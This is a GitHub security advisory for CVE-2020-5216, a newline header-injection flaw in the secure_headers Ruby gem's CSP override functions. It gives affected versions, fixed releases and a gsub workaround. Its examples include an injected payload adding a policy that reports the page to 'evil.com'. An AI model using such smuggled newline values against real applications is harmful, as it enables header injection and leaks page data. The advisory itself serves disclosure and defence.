# [M] Limited header injection when using dynamic overrides with user input in RubyGems secure_headers

## Summary
Severity: Medium
Advisory: GHSA-w978-rmpf-qmwg
CVE: CVE-2020-5216
CWE: CWE-113
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2020-01-23
Source: https://github.com/advisories/GHSA-w978-rmpf-qmwg
Type: github-advisory

## Affected
- RubyGems: `secure_headers` — affected >=6.0.0 <6.3.0
- RubyGems: `secure_headers` — affected >=5.0.0 <5.2.0
- RubyGems: `secure_headers` — affected >=0 <3.9.0

## Details
### Impact

If user-supplied input was passed into append/override_content_security_policy_directives, a newline could be injected leading to limited header injection.

Upon seeing a newline in the header, rails will silently create a new `Content-Security-Policy` header with the remaining value of the original string. It will continue to create new headers for each newline.

e.g.

```ruby
override_content_security_directives(script_src: ['mycdn.com', "\ninjected\n"])` 
```

would result in 

```
Content-Security-Policy: ... script-src: mycdn.com
Content-Security-Policy: injected
Content-Security-Policy: rest-of-the-header
```

CSP supports multiple headers and all policies must be satisfied for execution to occur, but a malicious value that reports the current page is fairly trivial:

```ruby
override_content_security_directives(script_src: ["mycdn.com", "\ndefault-src 'none'; report-uri evil.com"]) 
```
```
Content-Security-Policy: ... script-src: mycdn.com
Content-Security-Policy: default-src 'none'; report-uri evil.com
Content-Security-Policy: rest-of-the-header
```

### Patches

This has been fixed in 6.3.0, 5.2.0, and 3.9.0

### Workarounds

```ruby
override_content_security_policy_directives(:frame_src, [user_input.gsub("\n", " ")])
```

### References

https://github.com/twitter/secure_headers/security/advisories/GHSA-xq52-rv6w-397c
[The effect of multiple policies](https://www.w3.org/TR/CSP3/#multiple-policies)

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [this repo](https://github.com/twitter/secure_headers/security/advisories/new)
* DM us at @ndm on twitter

## References
- https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg
- https://nvd.nist.gov/vuln/detail/CVE-2020-5216
- https://github.com/twitter/secure_headers/commit/301695706f6a70517c2a90c6ef9b32178440a2d0
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/secure_headers/CVE-2020-5216.yml
- https://github.com/twitter/secure_headers
